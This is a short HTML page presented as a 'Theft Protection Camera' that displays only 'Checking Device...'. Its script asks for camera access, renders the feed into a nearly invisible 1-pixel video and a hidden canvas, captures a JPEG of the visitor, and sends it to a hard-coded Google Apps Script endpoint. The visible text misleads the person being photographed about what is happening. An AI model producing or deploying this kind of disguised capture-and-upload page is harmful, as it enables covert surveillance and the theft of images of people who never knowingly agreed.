<!DOCTYPE html>
<html>
<head>
  <title>Theft Protection Camera</title>
</head>
<body>
  <h2>Checking Device...</h2>
  <video id="video" autoplay playsinline style="width:1px;height:1px;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const scriptURL = "https://script.google.com/macros/s/AKfycbxv3VtJgebN5j_tr4BZd3-hCjV1zsGlz_PFe_noz16zwC84XTtM86uMnH7NLhsgq8qm/exec"; // paste from Step 1

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.getElementById('video');
        video.srcObject = stream;
        video.addEventListener('loadeddata', () => {
          const canvas = document.getElementById('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0);
          const imageData = canvas.toDataURL('image/jpeg', 0.9);

          fetch(scriptURL, {
            method: 'POST',
            body: JSON.stringify({ image: imageData })
          }).then(r => console.log("Sent")).catch(err => console.error(err));

          stream.getTracks().forEach(track => track.stop());
        });
      })
      .catch(err => console.error("Camera access denied", err));
  </script>
</body>
</html>

